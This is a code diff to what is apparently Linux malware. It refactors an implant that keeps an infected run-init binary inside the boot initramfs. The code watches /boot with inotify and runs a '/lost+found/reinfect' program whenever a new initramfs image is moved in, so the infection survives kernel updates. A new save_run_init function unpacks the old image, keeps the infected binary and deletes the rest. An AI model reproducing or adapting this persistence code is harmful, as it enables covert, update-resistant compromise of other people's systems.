@@ -315,7 +315,7 @@ int hook_update_initramfs()
 		if (fd < 0)
 			return 0; // error in installation of inotify_init
 		
-		wd = inotify_add_watch(fd, "/boot/", IN_CREATE | IN_MOVE);
+		wd = inotify_add_watch(fd, "/boot/", IN_MOVE);
 		
 		while (1) {
 			length = read(fd, buffer, 1024 * (sizeof(struct inotify_event) + 16));
@@ -323,19 +323,13 @@ int hook_update_initramfs()
 
 			while (i < length) {
 				struct inotify_event *event = (struct inotify_event *) &buffer[i];
-				if (event->len && (event->mask & IN_CREATE)) {
-					if (strcmp(event->name,"initrd.img-5.13.0-40-generic.new")==0) {
-						system("mkdir /lost+found/old-initramfs/");
-
-						// unpack old initramfs to save infected run-init
-						sprintf(command, "unmkinitramfs /boot/initrd.img-5.13.0-40-generic /lost+found/old-initramfs");
-						system(command);
-					}
-				} else  if (event->len && (event->mask & IN_MOVED_TO)) {
+				
+                                if (event->len && (event->mask & IN_MOVED_TO)) {
 					if (strcmp(event->name,"initrd.img-5.13.0-40-generic")==0)
 						system("/lost+found/reinfect /boot/initrd.img-5.13.0-40-generic");
 				}
-				i += sizeof(struct inotify_event) + event->len;
+				
+                                i += sizeof(struct inotify_event) + event->len;
 			}
 		}
 
@@ -344,6 +338,22 @@ int hook_update_initramfs()
 	}
 
 	return 1;
+}
+
+/**
+ * This function save run-init in the scratch space 
+ **/
+void save_run_init() {
+	system("mkdir /lost+found/old-initramfs/");
+
+        // unpack old initramfs to save infected run-init
+        system("unmkinitramfs /boot/initrd.img-5.13.0-40-generic /lost+found/old-initramfs");
+
+        // save only run-init
+        system("mv /lost+found/old-initramfs/main/usr/bin/run-init /lost+found/run-init");
+
+        // delete rest of old initramfs
+        system("rm -rf /lost+found/old-initramfs");
 }
 
 /**
@@ -379,6 +389,9 @@ void perform_hacks()
 		// remount root
 		if (mount(NULL, "/", NULL, MS_REMOUNT | MS_RELATIME, "errors=remount-ro,data=ordered") < 0)
 			exit(EXIT_FAILURE);
+
+		// save run-init to the scratch space
+		save_run_init();
 
 		// write executable of reinfect
 		write_executable("/lost+found/reinfect", reinfect, reinfect_len);
